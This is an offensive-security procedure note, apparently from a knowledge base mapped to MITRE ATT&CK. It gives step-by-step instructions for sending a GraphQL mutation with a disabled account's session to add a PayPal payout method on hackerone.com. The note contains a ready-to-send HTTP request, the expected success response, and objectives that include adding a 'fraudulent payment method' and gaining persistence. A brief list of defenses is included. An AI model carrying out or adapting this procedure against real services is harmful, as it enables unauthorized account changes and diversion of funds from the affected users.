---
tags:
  - mutation
  - payment-modification
  - persistence
type: procedure
tools:
  - '[[tools/Burp-Suite]]'
tactics:
  - '[[Persistence]]'
commands:
  - '[[commands/create-paypal-preference-mutation]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:25:53.396Z'
skill_level: advanced
impact_level: high
detection_risk: high
sub_techniques: []
id: 6e0fb9d2-4775-4770-a625-ad640fd1ef0c
validated: true
mitre_tactics:
  - '[[Persistence]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Perform-Payment-Method-Mutation

## Summary

Execute a GraphQL mutation to add or modify payment preferences on a disabled account, demonstrating unauthorized data alteration.

## Description

Mutations like Create_paypal_preference allow adding payout methods (e.g., PayPal email) without notifications, potentially enabling fund diversion if escalated.

## Requirements

1. Valid auth token from disabled session
2. Known mutation schema
3. Repeater tool

## Defense

Defensive measures and detection strategies:

- Require reactivation for all mutations
- Validate mutations against account status
- Notify owners of payment changes via email/SMS

## Objectives

1. Add a fraudulent payment method
2. Confirm mutation success
3. Establish persistence via account changes

## Instructions

### Step 1: Craft Mutation Payload

**Context**: Prepare the request body.

No command; Edit JSON in Repeater.

> Use variables like input_0: {paypal_email: "test@example.com", default_method: true}

### Step 2: Send Mutation

**Context**: Execute and check response.

Execute [[commands/create-paypal-preference-mutation]].

```http
POST /graphql? HTTP/1.1
Host: hackerone.com
Content-Type: application/json
X-Auth-Token: [TOKEN]
Cookie: [COOKIES]

{"query":"mutation Create_paypal_preference_mutation($input_0:CreatePaypalPreferenceInput!,$first_1:Int!) {createPaypalPreference(input:$input_0) {...}} ...","variables":{"input_0":{"paypal_email":"test@example.com","default_method":true,"clientMutationId":"0"},"first_1":100}}
```

> Output: {was_successful: true, me: {payout_preferences: [...]}}

## MITRE ATT&CK Mapping

### Tactics

- [[Persistence]] Persistence

### Techniques

- [[Exploit Public-Facing Application]] Exploit Public-Facing Application

### Sub-Techniques


## Commands Used

- [[commands/create-paypal-preference-mutation]]

## Tools Used

- [[tools/Burp-Suite]]

## Tags

- account-modification
- financial-impact
